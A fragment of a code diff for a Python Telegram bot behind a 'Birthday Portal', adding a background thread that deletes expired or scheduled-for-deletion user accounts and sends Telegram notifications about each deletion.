+                                f"• <b>Reason:</b> No link was generated within 48 to 72 hours.\n"
+                                f"• Account data has been permanently deleted from server. ✅"
+                            )
+                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
+                                "chat_id": owner_id,
+                                "text": msg,
+                                "parse_mode": "HTML"
+                            }, timeout=8)
+                        except Exception:
+                            pass
+                else:
+                    active_stamps[uname] = reg_time
+
+            if len(active_stamps) != len(registered_stamps):
+                cfg["registered_portal_timestamps"] = active_stamps
+                changes_made = True
+
+            # 3. Check Manual Scheduled Deletions (24h ban)
+            pending = cfg.get("scheduled_deletions", [])
+            still_pending = []
+
+            for d in pending:
+                if d.get("delete_at", 0) <= now:
+                    uname = d.get("username", "")
+                    if uname in users_db:
+                        del users_db[uname]
+                        changes_made = True
+
+                    tg_chat_id = d.get("tg_chat_id", "") or cfg.get("owner_chat_id", "")
+                    if BOT_TOKEN and "YOUR_TELEGRAM" not in BOT_TOKEN and tg_chat_id:
+                        try:
+                            msg = (
+                                f"🗑️ <b>PERMANENT DELETION COMPLETE</b>\n\n"
+                                f"• <b>Username:</b> <code>{uname}</code>\n"
+                                f"• <b>Status:</b> Account permanently deleted ✅\n"
+                                f"• <b>Time:</b> {time.strftime('%d %b %Y, %I:%M %p')}\n\n"
+                                f"This user can no longer login to the Birthday Portal."
+                            )
+                            requests.post(f"{BASE_TG_URL}/sendMessage", json={
+                                "chat_id": tg_chat_id,
+                                "text": msg,
+                                "parse_mode": "HTML"
+                            }, timeout=8)
+                        except Exception:
+                            pass
+                else:
+                    still_pending.append(d)
+
+            if len(still_pending) != len(pending):
+                cfg["scheduled_deletions"] = still_pending
+                changes_made = True
+
+            if changes_made:
+                cfg["birthday_portal_users"] = users_db
+                cfg["portal_user_data"] = portal_data
+                save_config(cfg)
+
+        except Exception as e:
+            print(f"[Cleanup Error]: {e}")
+
 
 def start_api_server(port=5000):
     server = HTTPServer(("0.0.0.0", port), WebhookHandler)
@@ -760,6 +1201,13 @@ if __name__ == "__main__":
     # Start HTTP API server in background thread
     api_thread = threading.Thread(target=start_api_server, args=(config.get("api_port", 5000),), daemon=True)
     api_thread.start()
+
+    # Start scheduled deletion cleanup thread (runs every 60s)
+    cleanup_thread = threading.Thread(target=cleanup_scheduled_deletions, daemon=True)
+    cleanup_thread.start()
+
+    # Configure Telegram 3-line burger menu commands
+    setup_telegram_menu()
 
     # Run Telegram Bot Polling in main thread
     handle_updates()
